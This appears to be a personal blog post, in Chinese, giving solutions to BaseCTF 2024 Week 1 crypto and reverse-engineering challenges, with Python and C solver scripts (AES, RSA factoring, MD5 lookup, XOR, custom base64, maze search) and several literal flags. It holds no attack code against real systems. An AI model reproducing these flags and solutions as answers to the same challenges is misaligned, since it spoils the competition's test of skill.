<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Basectf2024 | 0raN9e's Blog</title><meta name=keywords content="ctf"><meta name=description content="BaseCTF 2024 个人题解"><meta name=author content><link rel=canonical href=http://localhost:1313/posts/ctf/basectf2024/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://localhost:1313/posts/ctf/basectf2024/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://localhost:1313/posts/ctf/basectf2024/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="Basectf2024"><meta property="og:description" content="BaseCTF 2024 个人题解"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-08-21T15:00:00+08:00"><meta property="article:modified_time" content="2024-08-21T15:00:00+08:00"><meta property="article:tag" content="Ctf"><meta name=twitter:card content="summary"><meta name=twitter:title content="Basectf2024"><meta name=twitter:description content="BaseCTF 2024 个人题解"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"文章","item":"http://localhost:1313/posts/ctf/"},{"@type":"ListItem","position":3,"name":"Basectf2024","item":"http://localhost:1313/posts/ctf/basectf2024/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Basectf2024","name":"Basectf2024","description":"BaseCTF 2024 个人题解","keywords":["ctf"],"articleBody":"Week1 Crypto hello_crypto from Crypto.Util.number import long_to_bytes\rfrom Crypto.Cipher import AES\rfrom Crypto.Util.Padding import unpad\r# 已知的 key1 和密文\rkey1 = 208797759953288399620324890930572736628\rciphertext = b'U\\xcd\\xf3\\xb1 r\\xa1\\x8e\\x88\\x92Sf\\x8a`Sk],\\xa3(i\\xcd\\x11\\xd0D\\x1edd\\x16[\u0026\\x92@^\\xfc\\xa9(\\xee\\xfd\\xfb\\x07\\x7f:\\x9b\\x88\\xfe{\\xae'\r# 将 key1 转换为字节格式\rkey = long_to_bytes(key1)\r# 创建 AES 解密器\rmy_aes = AES.new(key=key, mode=AES.MODE_ECB)\r# 解密并去除填充\rdecrypted_data = unpad(my_aes.decrypt(ciphertext), AES.block_size)\r# 打印解密后的数据\rprint(decrypted_data) ez_rsa from Crypto.Util.number import long_to_bytes, inverse import gmpy2 # 已知的 n, not_phi 和 c n = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421 not_phi = 96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205 c = 37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945 e = 65537 # Step 1: 从 n 和 not_phi 计算出 p 和 q # p*q = n, (p+2)*(q+2) = not_phi # 展开得到 pq + 2p + 2q + 4 = not_phi # p + q = (not_phi - n - 4) / 2 s = (not_phi - n - 4) // 2 # 使用求解二次方程的方法解出 p 和 q # x^2 - sx + n = 0 discriminant = gmpy2.isqrt(s*s - 4*n) p = (s + discriminant) // 2 q = (s - discriminant) // 2 # Step 2: 计算 φ(n) phi = (p - 1) * (q - 1) # Step 3: 计算私钥 d d = inverse(e, phi) # Step 4: 解密密文 m = pow(c, d, n) # Step 5: 将解密的数字转换为字符串 decrypted_message = long_to_bytes(m) # 打印解密后的数据 print(decrypted_message) 你会算md5吗 import hashlib # Helper function to compute MD5 hash of a string def md5_hash(text): return hashlib.md5(text.encode()).hexdigest() # Possible characters possible_chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^\u0026*()_+-=[]{}|;:,.\u003c\u003e?/\" # Given hashes hashes = [ '9d5ed678fe57bcca610140957afab571', '0cc175b9c0f1b6a831c399e269772661', '03c7c0ace395d80182db07ae2c30f034', 'e1671797c52e15f763380b45e841ec32', '0d61f8370cad1d412f80b84d143e1257', 'b9ece18c950afbfa6b0fdbfa4ff731d3', '800618943025315f869e4e1f09471012', 'f95b70fdc3088560732a5ac135644506', '0cc175b9c0f1b6a831c399e269772661', 'a87ff679a2f3e71d9181a67b7542122c', '92eb5ffee6ae2fec3ad71c777531578f', '8fa14cdd754f91cc6554c9e71929cce7', 'a87ff679a2f3e71d9181a67b7542122c', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '0cc175b9c0f1b6a831c399e269772661', 'e4da3b7fbbce2345d7772b0674a318d5', '336d5ebc5436534e61d16e63ddfca327', 'eccbc87e4b5ce2fe28308fd9f2a7baf3', '8fa14cdd754f91cc6554c9e71929cce7', '8fa14cdd754f91cc6554c9e71929cce7', '45c48cce2e2d7fbdea1afc51c7c6ad26', '336d5ebc5436534e61d16e63ddfca327', 'a87ff679a2f3e71d9181a67b7542122c', '8f14e45fceea167a5a36dedd4bea2543', '1679091c5a880faf6fb5e6087eb1b2dc', 'a87ff679a2f3e71d9181a67b7542122c', '336d5ebc5436534e61d16e63ddfca327', '92eb5ffee6ae2fec3ad71c777531578f', '8277e0910d750195b448797616e091ad', '0cc175b9c0f1b6a831c399e269772661', 'c81e728d9d4c2f636f067f89cc14862c', '336d5ebc5436534e61d16e63ddfca327', '0cc175b9c0f1b6a831c399e269772661', '8fa14cdd754f91cc6554c9e71929cce7', 'c9f0f895fb98ab9159f51fd0297e236d', 'e1671797c52e15f763380b45e841ec32', 'e1671797c52e15f763380b45e841ec32', 'a87ff679a2f3e71d9181a67b7542122c', '8277e0910d750195b448797616e091ad', '92eb5ffee6ae2fec3ad71c777531578f', '45c48cce2e2d7fbdea1afc51c7c6ad26', '0cc175b9c0f1b6a831c399e269772661', 'c9f0f895fb98ab9159f51fd0297e236d', '0cc175b9c0f1b6a831c399e269772661', 'cbb184dd8e05c9709e5dcaedaa0495cf' ] # Find corresponding characters decoded_flag = '' for hash_val in hashes: found = False for char in possible_chars: if md5_hash(char) == hash_val: decoded_flag += char found = True break if not found: decoded_flag += '?' # Use a placeholder if hash not found print(f\"Decoded flag: {decoded_flag}\") 十七倍 #include int main() { unsigned char cipher[] = { 98, 113, 163, 181, 115, 148, 166, 43, 9, 95, 165, 146, 79, 115, 146, 233, 112, 180, 48, 79, 65, 181, 113, 146, 46, 249, 78, 183, 79, 133, 180, 113, 146, 148, 163, 79, 78, 48, 231, 77 }; unsigned char flag[40]; unsigned char inverse = 241; // 17's modular inverse modulo 256 for (int i = 0; i \u003c 40; i++) { flag[i] = (cipher[i] * inverse) % 256; } // Print the decrypted flag printf(\"Decrypted flag: \"); for (int i = 0; i \u003c 40; i++) { printf(\"%c\", flag[i]); } printf(\"\\n\"); return 0; } babypack from Crypto.Util.number import long_to_bytes # 从文件中读取a和c的值 with open('D:\\\\谷歌\\\\babypack\\\\output.txt', 'r') as f: lines = f.readlines() a = eval(lines[0].strip().split('=')[1]) c = int(lines[1].strip().split('=')[1]) bin_m = [] for i in range(len(a)): if c \u003e= a[i]: bin_m.append('1') c -= a[i] else: bin_m.append('0') # 将bin_m转换回整数m m = int(''.join(bin_m), 2) # 将m转换回flag flag = long_to_bytes(m) print(flag) Re You are good at IDA 按照shift和f12进行查找最后拼接就行了\nBaseCTF{Y0u_4Re_900d_47_id4}\nUPX mini QmFzZUNURntIYXYzX0BfZzBvZF90MW0zISEhfQ==\nbase64解密\nBaseCTF{Hav3_@_g0od_t1m3!!!}\nez_maze from collections import deque def find_path(maze, start_pos, end_pos): ROWS = len(maze) COLS = len(maze[0]) def move(pos, direction): x, y = divmod(pos, COLS) if direction == 'd': # Right return pos + 1 elif direction == 's': # Down return pos + COLS elif direction == 'w': # Up return pos - COLS elif direction == 'a': # Left return pos - 1 return pos def is_valid(pos): if pos \u003c 0 or pos \u003e= ROWS * COLS: return False x, y = divmod(pos, COLS) return maze[x][y] != '$' queue = deque([(start_pos, '')]) visited = set() visited.add(start_pos) while queue: current_pos, path = queue.popleft() if current_pos == end_pos: return path for direction in 'dsaw': new_pos = move(current_pos, direction) if is_valid(new_pos) and new_pos not in visited: visited.add(new_pos) queue.append((new_pos, path + direction)) return None # 迷宫初始化 maze = [ \"x$$$$$$$$$$$$$$\", \"\u0026\u0026\u0026\u0026\u0026\u0026$$$$$$$$$\", \"\u0026$\u0026$$\u0026$$\u0026\u0026\u0026\u0026\u0026$$\", \"\u0026$\u0026$$$\u0026\u0026$$$$\u0026$$\", \"\u0026$$$\u0026\u0026\u0026$$$$$\u0026$$\", \"\u0026$$$\u0026$\u0026\u0026$\u0026$$$$$\", \"\u0026$$$\u0026$\u0026$$\u0026\u0026\u0026$$$\", \"\u0026\u0026\u0026\u0026\u0026$\u0026\u0026\u0026\u0026$\u0026$$$\", \"$$$$$$\u0026\u0026\u0026\u0026\u0026\u0026$$$\", \"$$$$$$\u0026$$$$$$$$\", \"$$$\u0026\u0026\u0026\u0026$$\u0026\u0026\u0026$$$\", \"$$$\u0026\u0026\u0026\u0026\u0026\u0026\u0026$$$$$\", \"$$$$$$$$$\u0026$$\u0026$$\", \"$$$$$$$$$\u0026$\u0026$$$\", \"$$$$$$\u0026\u0026\u0026\u0026\u0026\u0026\u0026\u0026y\" ] # 将迷宫数据转换为一维列表 ROWS = 15 COLS = 15 maze_1d = ''.join(maze) # 起点和终点 START = 0 END = (ROWS - 1) * COLS + (COLS - 1) # 最后一行最后一列的位置 # 查找路径 path = find_path([maze_1d[i * COLS:(i + 1) * COLS] for i in range(ROWS)], START, END) if path: print(f\"找到的路径：{path}\") else: print(\"没有找到路径\") 最后进行MD5加密就行\nBasePlus import base64 # Secret array used in encoding Secret = '/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC' def decode(encoded_str): decoded_str = \"\" # Step 1: XOR each character with 0xE to undo the XOR applied during encoding xor_str = \"\".join(chr(ord(char) ^ 0xE) for char in encoded_str) # Process the string in chunks of 4 characters for i in range(0, len(xor_str), 4): enc_chunk = xor_str[i:i+4] try: # Reverse the Base64-like encoding using the Secret array v15 = (Secret.index(enc_chunk[0]) \u003c\u003c 2) | (Secret.index(enc_chunk[1]) \u003e\u003e 4) v16 = ((Secret.index(enc_chunk[1]) \u0026 0xF) \u003c\u003c 4) | (Secret.index(enc_chunk[2]) \u003e\u003e 2) v17 = ((Secret.index(enc_chunk[2]) \u0026 0x3) \u003c\u003c 6) | Secret.index(enc_chunk[3]) # Reconstruct the original characters decoded_str += chr(v15) if v16 != 0: decoded_str += chr(v16) if v17 != 0: decoded_str += chr(v17) except ValueError as e: print(f\"Error processing chunk: {enc_chunk} - {e}\") return None return decoded_str # Example usage encoded_str = \"lvfzBiZiOw7aD!\" decoded_str = decode(encoded_str) if decoded_str is not None: print(f\"Decoded string: {decoded_str}\") else: print(\"Decoding failed due to an error.\") Ez Xor import struct def key_stream(key, length): \"\"\"生成与输入数据长度相同的key stream\"\"\" return bytes([i ^ key[i % len(key)] for i in range(length)]) def encrypt_decrypt(data, key_stream): \"\"\"对数据进行加密/解密操作\"\"\" return bytes([data[i] ^ key_stream[len(data) - i - 1] for i in range(len(data))]) def attempt_decryption(encrypted_data, key): \"\"\"尝试用给定的key解密数据\"\"\" key_stream_data = key_stream(key, len(encrypted_data)) decrypted = encrypt_decrypt(encrypted_data, key_stream_data) try: flag = decrypted.decode('ascii') if flag.startswith(\"Base\"): return flag, \"可能的flag\" else: return flag, \"解密结果\" except UnicodeDecodeError: return decrypted.hex(), \"无法解码为ASCII，十六进制结果\" def main(): encrypted_flag = ( b'\\x01\\x09\\x05\\x25\\x26\\x2D\\x0B\\x1D' b'\\x24\\x7A\\x31\\x20\\x1E\\x49\\x3D\\x67' b'\\x4D\\x50\\x08\\x25\\x2E\\x6E\\x05\\x34' b'\\x22\\x40\\x3B\\x25' ) key_value = 7499608 # 定义不同格式的key keys = [ struct.pack('","wordCount":"10076","inLanguage":"zh-cn","datePublished":"2024-08-21T15:00:00+08:00","dateModified":"2024-08-21T15:00:00+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/ctf/basectf2024/"},"publisher":{"@type":"Organization","name":"0raN9e's Blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/ title=首页><span>首页</span></a></li><li><a href=http://localhost:1313/archives/ title=归档><span>归档</span></a></li><li><a href=http://localhost:1313/tags/ title=标签><span>标签</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=http://localhost:1313/about/ title=关于><span>关于</span></a></li><li><a href=http://localhost:1313/links/ title=友链><span>友链</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2024-08-21 15:00:00 +0800 CST'>August 21, 2024</span>&nbsp;·&nbsp;<span>21 min</span><h1 class=post-title>Basectf2024</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><h1 id=week1>Week1</h1><h2 id=crypto>Crypto</h2><h3 id=hello_crypto>hello_crypto</h3><pre tabindex=0><code>from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# 已知的 key1 和密文
key1 = 208797759953288399620324890930572736628
ciphertext = b&#39;U\xcd\xf3\xb1 r\xa1\x8e\x88\x92Sf\x8a`Sk],\xa3(i\xcd\x11\xd0D\x1edd\x16[&amp;\x92@^\xfc\xa9(\xee\xfd\xfb\x07\x7f:\x9b\x88\xfe{\xae&#39;

# 将 key1 转换为字节格式
key = long_to_bytes(key1)

# 创建 AES 解密器
my_aes = AES.new(key=key, mode=AES.MODE_ECB)

# 解密并去除填充
decrypted_data = unpad(my_aes.decrypt(ciphertext), AES.block_size)

# 打印解密后的数据
print(decrypted_data)
</code></pre><h3 id=ez_rsa>ez_rsa</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes, inverse
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 已知的 n, not_phi 和 c</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790344897976690691139671461342896437428086142262969360560293350630096355947291129943172939923835317907954465556018515239228081131167407674558849860647237317421</span>
</span></span><span style=display:flex><span>not_phi <span style=color:#f92672>=</span> <span style=color:#ae81ff>96557532552764825748472768984579682122986562613246880628804186193992067825769559200526147636851266716823209928173635593695093547063827866240583007222790384900615665394180812810697286554008262030049280213663390855887077502992804805794388166197820395507600028816810471093163466639673142482751115353389655533205</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>37077223015399348092851894372646658604740267343644217689655405286963638119001805842457783136228509659145024536105346167019011411567936952592106648947994192469223516127472421779354488529147931251709280386948262922098480060585438392212246591935850115718989480740299246709231437138646467532794139869741318202945</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Step 1: 从 n 和 not_phi 计算出 p 和 q</span>
</span></span><span style=display:flex><span><span style=color:#75715e># p*q = n, (p+2)*(q+2) = not_phi</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 展开得到 pq + 2p + 2q + 4 = not_phi</span>
</span></span><span style=display:flex><span><span style=color:#75715e># p + q = (not_phi - n - 4) / 2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> (not_phi <span style=color:#f92672>-</span> n <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 使用求解二次方程的方法解出 p 和 q</span>
</span></span><span style=display:flex><span><span style=color:#75715e># x^2 - sx + n = 0</span>
</span></span><span style=display:flex><span>discriminant <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>isqrt(s<span style=color:#f92672>*</span>s <span style=color:#f92672>-</span> <span style=color:#ae81ff>4</span><span style=color:#f92672>*</span>n)
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> (s <span style=color:#f92672>+</span> discriminant) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> (s <span style=color:#f92672>-</span> discriminant) <span style=color:#f92672>//</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Step 2: 计算 φ(n)</span>
</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Step 3: 计算私钥 d</span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> inverse(e, phi)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Step 4: 解密密文</span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Step 5: 将解密的数字转换为字符串</span>
</span></span><span style=display:flex><span>decrypted_message <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 打印解密后的数据</span>
</span></span><span style=display:flex><span>print(decrypted_message)
</span></span></code></pre></div><h3 id=你会算md5吗>你会算md5吗</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Helper function to compute MD5 hash of a string</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5_hash</span>(text):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> hashlib<span style=color:#f92672>.</span>md5(text<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Possible characters</span>
</span></span><span style=display:flex><span>possible_chars <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()_+-=[]</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>|;:,.&lt;&gt;?/&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Given hashes</span>
</span></span><span style=display:flex><span>hashes <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;9d5ed678fe57bcca610140957afab571&#39;</span>, <span style=color:#e6db74>&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;03c7c0ace395d80182db07ae2c30f034&#39;</span>, <span style=color:#e6db74>&#39;e1671797c52e15f763380b45e841ec32&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;0d61f8370cad1d412f80b84d143e1257&#39;</span>, <span style=color:#e6db74>&#39;b9ece18c950afbfa6b0fdbfa4ff731d3&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;800618943025315f869e4e1f09471012&#39;</span>, <span style=color:#e6db74>&#39;f95b70fdc3088560732a5ac135644506&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span>, <span style=color:#e6db74>&#39;a87ff679a2f3e71d9181a67b7542122c&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;92eb5ffee6ae2fec3ad71c777531578f&#39;</span>, <span style=color:#e6db74>&#39;8fa14cdd754f91cc6554c9e71929cce7&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;a87ff679a2f3e71d9181a67b7542122c&#39;</span>, <span style=color:#e6db74>&#39;eccbc87e4b5ce2fe28308fd9f2a7baf3&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span>, <span style=color:#e6db74>&#39;e4da3b7fbbce2345d7772b0674a318d5&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;336d5ebc5436534e61d16e63ddfca327&#39;</span>, <span style=color:#e6db74>&#39;eccbc87e4b5ce2fe28308fd9f2a7baf3&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;8fa14cdd754f91cc6554c9e71929cce7&#39;</span>, <span style=color:#e6db74>&#39;8fa14cdd754f91cc6554c9e71929cce7&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;45c48cce2e2d7fbdea1afc51c7c6ad26&#39;</span>, <span style=color:#e6db74>&#39;336d5ebc5436534e61d16e63ddfca327&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;a87ff679a2f3e71d9181a67b7542122c&#39;</span>, <span style=color:#e6db74>&#39;8f14e45fceea167a5a36dedd4bea2543&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;1679091c5a880faf6fb5e6087eb1b2dc&#39;</span>, <span style=color:#e6db74>&#39;a87ff679a2f3e71d9181a67b7542122c&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;336d5ebc5436534e61d16e63ddfca327&#39;</span>, <span style=color:#e6db74>&#39;92eb5ffee6ae2fec3ad71c777531578f&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;8277e0910d750195b448797616e091ad&#39;</span>, <span style=color:#e6db74>&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;c81e728d9d4c2f636f067f89cc14862c&#39;</span>, <span style=color:#e6db74>&#39;336d5ebc5436534e61d16e63ddfca327&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span>, <span style=color:#e6db74>&#39;8fa14cdd754f91cc6554c9e71929cce7&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;c9f0f895fb98ab9159f51fd0297e236d&#39;</span>, <span style=color:#e6db74>&#39;e1671797c52e15f763380b45e841ec32&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;e1671797c52e15f763380b45e841ec32&#39;</span>, <span style=color:#e6db74>&#39;a87ff679a2f3e71d9181a67b7542122c&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;8277e0910d750195b448797616e091ad&#39;</span>, <span style=color:#e6db74>&#39;92eb5ffee6ae2fec3ad71c777531578f&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;45c48cce2e2d7fbdea1afc51c7c6ad26&#39;</span>, <span style=color:#e6db74>&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;c9f0f895fb98ab9159f51fd0297e236d&#39;</span>, <span style=color:#e6db74>&#39;0cc175b9c0f1b6a831c399e269772661&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;cbb184dd8e05c9709e5dcaedaa0495cf&#39;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Find corresponding characters</span>
</span></span><span style=display:flex><span>decoded_flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> hash_val <span style=color:#f92672>in</span> hashes:
</span></span><span style=display:flex><span>    found <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> possible_chars:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> md5_hash(char) <span style=color:#f92672>==</span> hash_val:
</span></span><span style=display:flex><span>            decoded_flag <span style=color:#f92672>+=</span> char
</span></span><span style=display:flex><span>            found <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> found:
</span></span><span style=display:flex><span>        decoded_flag <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;?&#39;</span>  <span style=color:#75715e># Use a placeholder if hash not found</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Decoded flag: </span><span style=color:#e6db74>{</span>decoded_flag<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><h3 id=十七倍>十七倍</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> cipher[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>98</span>, <span style=color:#ae81ff>113</span>, <span style=color:#ae81ff>163</span>, <span style=color:#ae81ff>181</span>, <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>148</span>, <span style=color:#ae81ff>166</span>, <span style=color:#ae81ff>43</span>, <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>95</span>,
